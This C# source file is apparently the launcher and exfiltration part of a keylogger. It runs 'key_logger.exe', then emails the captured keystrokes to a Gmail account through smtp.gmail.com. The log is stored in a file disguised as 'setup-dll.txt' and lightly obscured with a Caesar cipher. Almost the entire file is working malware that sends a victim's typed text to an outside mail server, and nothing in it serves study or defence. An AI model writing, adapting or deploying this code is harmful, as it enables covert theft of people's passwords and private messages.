using System;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;

namespace MSWA
{
    class Program
    {
        static void Main(string[] args){

            Process keylogger = new Process();
            keylogger.StartInfo.FileName = "key_logger.exe";
            keylogger.Start();
            keylogger.WaitForExit();
            
            Email();
        }

        public static void Email()
        {
            try
            {
                MailMessage message = new MailMessage();
                SmtpClient smtp = new SmtpClient();

                message.From = new MailAddress("address@gmail.com");
                message.To.Add(new MailAddress("address@gmail.com"));
                message.Subject = "Encrypted File";
                message.Attachments.Add(new Attachment("setup-dll.txt")); // the typed text will be written in this 
				// file with encryption level of ceaser cypher. Cypher shift is placed at the start of the key in integer form.
				// every other information is encrypted

                //message.IsBodyHtml = true; //to make message body as html  
                //message.Body = htmlString;
                smtp.Port = 587;
                smtp.Host = "smtp.gmail.com"; //for gmail host  
                smtp.EnableSsl = true;
                smtp.UseDefaultCredentials = false;
                smtp.Credentials = new NetworkCredential("address@gmail.com", "password");
                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtp.Send(message);

                Console.WriteLine("Sent");
            }
            catch (Exception obj) {
                Console.WriteLine("Exception Thrown");
                Console.WriteLine(obj.Message);
            }
        }
    }
}
